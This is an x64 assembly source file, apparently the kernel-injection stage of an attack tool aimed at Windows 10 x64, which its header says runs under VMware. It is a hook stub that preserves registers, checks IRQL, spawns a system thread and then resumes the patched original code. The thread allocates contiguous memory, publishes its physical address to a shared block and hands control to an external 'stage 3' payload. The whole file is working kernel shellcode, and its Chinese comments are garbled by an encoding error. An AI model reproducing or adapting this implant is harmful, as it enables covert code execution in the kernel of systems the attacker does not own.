;Win10X64Inject.asm : VmWare Win10X64�ں�ע��ִ�д���(ShellCode)

EXTRN WX64STAGE3EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0:��ʼ�������ڴ�λ�ã���ʼ���ֵ
	; ----------------------------------------------------
	JMP MainStart 
	DataFiller				    	db 00h, 00h				; +002
	OriginalCode:
	DataOriginalCode				dd 44444444h, 44444444h, 44444444h, 44444444h, 44444444h	; +004
	AddrData						dq 1111111111111111h	; +018 DataBlock
	pfnKeGetCurrentIrql				dq 1111111111111111h	; +020
	pfnPsCreateSystemThread			dq 1111111111111111h	; +028
	pfnZwClose						dq 1111111111111111h	; +030
	pfnMmAllocateContiguousMemory	dq 1111111111111111h	; +038
	pfnMmGetPhysicalAddress			dq 1111111111111111h	; +040
	KernelBaseAddr					dq 1111111111111111h	; +048
	; ----------------------------------------------------
	; 1: ����ԭʼ����
	; ----------------------------------------------------
MainStart:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rdi
	PUSH rsi
	PUSH rbx
	PUSH rbp
	SUB rsp, 020h
	; ----------------------------------------------------
	;��鵱ǰ��IRQL����ֻ����IRQL(PASSIVE_LEVEL)
	; ----------------------------------------------------
	CALL [pfnKeGetCurrentIrql]
	TEST rax, rax
	JNZ SkipCall
	; ----------------------------------------------------
	; ȷ���̵߳�ԭ����
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, AddrData
	LOCK CMPXCHG [rcx], dl
	JNE SkipCall
	; ----------------------------------------------------
	; ����ϵͳ�߳�
	; ----------------------------------------------------
	PUSH r12					; StartContext
	LEA rax, ThreadProcedure
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h				; (stack shadow space)
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	MOV rcx, AddrData			; ThreadHandle
	ADD rcx, 8
	CALL [pfnPsCreateSystemThread]
	ADD rsp, 038h
	; ----------------------------------------------------
	; �ر��߳̾��
	; ----------------------------------------------------
	SUB rsp, 038h				
	MOV rcx, AddrData			; ThreadHandle
	MOV rcx, [rcx+8]
	CALL [pfnZwClose]
	ADD rsp, 038h
	; ----------------------------------------------------
	; �˳�-�ָ���JMP����
	; ----------------------------------------------------
SkipCall:
	ADD rsp, 020h
	POP rbp
	POP rbx
	POP rsi
	POP rdi
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rdx
	POP rcx
	JMP OriginalCode
main ENDP

; ----------------------------------------------------
;  �µ��߳���ڵ㡣�����ڴ沢д�������ַ
; ----------------------------------------------------
ThreadProcedure PROC
	; ----------------------------------------------------
	; ���ö�ջ�ռ�(����������Ҫ)
	; ----------------------------------------------------
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 020h
	; ----------------------------------------------------
	; ��0x7fffffff�������0x1000�����ڴ�,����ͨ��
	; ----------------------------------------------------
	MOV rcx, 1000h
	MOV rdx, 7fffffffh
	CALL [pfnMmAllocateContiguousMemory]
	MOV r13, rax
	; ----------------------------------------------------
	; ZeroMemroy();
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 200h
	ClearLoop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ ClearLoop
	; ----------------------------------------------------
	; д�������ڴ��ַ
	; ----------------------------------------------------
	MOV rcx, r13
	CALL [pfnMmGetPhysicalAddress]
	MOV rcx, AddrData
	MOV [rcx+01ch], eax
	; ----------------------------------------------------
	; SET PKMDJATA->KernelBaseAddr
	; ----------------------------------------------------
	MOV rax, KernelBaseAddr
	MOV [r13+8], rax
	; ----------------------------------------------------
	; CALL C-WX64STAGE3EntryPoint
	; ----------------------------------------------------
	MOV rcx, r13
	CALL WX64STAGE3EntryPoint
	; ----------------------------------------------------
	; RETURN����
	; ----------------------------------------------------
	ADD rsp, 028h
	XOR rax, rax
	RET
ThreadProcedure ENDP

END
